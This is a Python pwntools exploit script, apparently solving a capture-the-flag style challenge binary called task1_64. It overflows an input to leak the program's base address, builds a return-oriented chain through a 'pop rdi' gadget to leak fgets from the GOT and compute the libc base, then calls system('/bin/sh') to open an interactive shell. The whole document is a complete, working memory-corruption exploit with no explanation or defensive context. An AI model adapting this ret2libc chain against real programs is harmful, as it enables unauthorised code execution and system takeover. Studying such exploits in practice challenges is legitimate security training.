from pwn import *

p = process("./task1_64")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
payload = "A"*37 + "zz"
p.sendline("read")
p.sendline(payload)
p.sendline("gomugomunomi")
p.recvuntil("right ? : ")
leak = int("0x" + p.recvline(),16)
binaire = leak - 0x1325
puts_plt = binaire + 0x1030
fgets_got = binaire + 0x4030
#Gadgets
poprdi = binaire + 0x148b
ret = binaire + 0x1016
log.info("base binaire = "+hex(binaire))

payload = ""
payload += cyclic(56)
payload += p64(ret)
payload += p64(poprdi)
payload += p64(fgets_got)
payload += p64(puts_plt)
payload += p64(leak+0x5)
pause()
p.sendline(payload)
p.recvline()
base = u64(p.recvline().ljust(8,"\x00")) % 0xa000000000000 - libc.symbols['fgets']
log.info("libc base = "+hex(base)) 
p.sendline("A"*37 + "zz")
p.sendline("gomugomunomi")

system = base + libc.symbols['system']
binsh = base + libc.search("/bin/sh").next()
log.info("/bin/sh = "+hex(binsh))
log.info("system = "+hex(system))
payload = ""
payload += cyclic(56)
payload += p64(ret)
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(system)
p.sendline(payload)
p.interactive()